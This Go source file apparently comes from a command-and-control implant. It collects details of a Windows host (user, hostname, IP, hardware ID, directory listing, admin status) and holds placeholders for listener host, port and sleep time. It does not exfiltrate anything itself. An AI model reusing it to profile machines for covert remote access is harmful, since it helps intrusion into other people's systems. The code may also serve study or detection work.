package PcInfo

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"main/Helper/sysinfo"
	"net"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var RemarkContext string = ""
var RemarkColor string = ""
var GroupInfo string = "Windows"
var Host string = ""
var Port string = ""
var ListenerName string = ""
var SleepTime string = "SleepAAAABBBBCCCCDDDD"
var IsDotNetFour bool = false
var (
	modKernel32       = syscall.NewLazyDLL("kernel32.dll")
	procGetVersionExW = modKernel32.NewProc("GetVersionExW")
)

type OSVERSIONINFOEXW struct {
	dwOSVersionInfoSize uint32
	dwMajorVersion      uint32
	dwMinorVersion      uint32
	dwBuildNumber       uint32
	dwPlatformId        uint32
	szCSDVersion        [128]uint16 // WCHAR[128]
	wServicePackMajor   uint16
	wServicePackMinor   uint16
	wSuiteMask          uint16
	wProductType        byte
	wReserved           byte
}

func GetProcessID() string {
	return strconv.Itoa(os.Getpid())
}

func GetProcessName() string {
	return os.Args[0]
}

func GetHWID() string {
	data := fmt.Sprintf("%d%s%s%d", runtime.NumCPU(), os.Getenv("USER"), runtime.GOOS, 0)
	hasher := md5.New()
	hasher.Write([]byte(data))
	return strings.ToUpper(hex.EncodeToString(hasher.Sum(nil))[:20])
}

func GetInternalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}

	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}

	return ""
}
func GetUserName() string {
	username := os.Getenv("USERNAME")
	return username
}

func GetCurrentUser() string {
	usr, err := user.Current()
	if err != nil {
		return ""
	}

	return usr.Username
}

func ListFiles() string {
	files, err := ioutil.ReadDir(".")
	if err != nil {
		log.Fatal(err)
	}

	var infoStrings []string
	infoStrings = append(infoStrings, fmt.Sprintf("%-15s %-10s %-20s %-25s", "Name", "Size", "Mode", "ModTime"))
	infoStrings = append(infoStrings, "-------------------------------------------------------------------------------------")

	for _, file := range files {
		infoStrings = append(infoStrings, fmt.Sprintf("%-15s %-10d %-20s %-25s", file.Name(), file.Size(), file.Mode(), file.ModTime()))
	}

	return strings.Join(infoStrings, "\n")
}
func GetClientComputer() string {
	hostname, err := os.Hostname()
	if err != nil {
		return ""
	}
	return hostname
}

func GetCurrentDirectory() string {
	dir, err := os.Getwd()
	if err != nil {
		//fmt.Println("Error: ", err)
		return ""
	}
	return dir
}

func GetOSVersion() string {
	return GetWindowsVersion()

}
func GetWindowsVersion() string {
	return sysinfo.WindosVersion()
}

const (
	errnoERROR_IO_PENDING = 997
)

var (
	errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
)

// errnoErr returns common boxed Errno values, to prevent
// allocations at runtime.
func errnoErr(e syscall.Errno) error {
	switch e {
	case 0:
		return nil
	case errnoERROR_IO_PENDING:
		return errERROR_IO_PENDING
	}
	// TODO: add more here, after collecting data on the common
	// error values see on Windows. (perhaps when running
	// all.bat?)
	return e
}

var (
	modadvapi32 = windows.NewLazySystemDLL("advapi32.dll")
	modkernel32 = windows.NewLazySystemDLL("kernel32.dll")

	procGetCurrentThread = modkernel32.NewProc("GetCurrentThread")
	procOpenThreadToken  = modadvapi32.NewProc("OpenThreadToken")
	procImpersonateSelf  = modadvapi32.NewProc("ImpersonateSelf")
	procRevertToSelf     = modadvapi32.NewProc("RevertToSelf")
)

func GetCurrentThread() (pseudoHandle windows.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetCurrentThread.Addr(), 0, 0, 0, 0)
	pseudoHandle = windows.Handle(r0)
	if pseudoHandle == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func OpenThreadToken(h windows.Handle, access uint32, self bool, token *windows.Token) (err error) {
	var _p0 uint32
	if self {
		_p0 = 1
	} else {
		_p0 = 0
	}
	r1, _, e1 := syscall.Syscall6(procOpenThreadToken.Addr(), 4, uintptr(h), uintptr(access), uintptr(_p0), uintptr(unsafe.Pointer(token)), 0, 0)
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func ImpersonateSelf() (err error) {
	r0, _, e1 := syscall.Syscall(procImpersonateSelf.Addr(), 1, uintptr(2), 0, 0)
	if r0 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func RevertToSelf() (err error) {
	r0, _, e1 := syscall.Syscall(procRevertToSelf.Addr(), 0, 0, 0, 0)
	if r0 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func OpenCurrentThreadToken() (windows.Token, error) {
	if e := ImpersonateSelf(); e != nil {
		return 0, e
	}
	defer RevertToSelf()
	t, e := GetCurrentThread()
	if e != nil {
		return 0, e
	}
	var tok windows.Token
	e = OpenThreadToken(t, windows.TOKEN_QUERY, true, &tok)
	if e != nil {
		return 0, e
	}
	return tok, nil
}

func IsAdmin() string {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(&windows.SECURITY_NT_AUTHORITY, 2, windows.SECURITY_BUILTIN_DOMAIN_RID, windows.DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid)
	if err != nil {
		panic(err)
	}

	token, err := OpenCurrentThreadToken()
	if err != nil {
		panic(err)
	}

	member, err := token.IsMember(sid)
	if err != nil {
		panic(err)
	}
	if member {
		return "Admin"
	} else {
		return "User"
	}

}
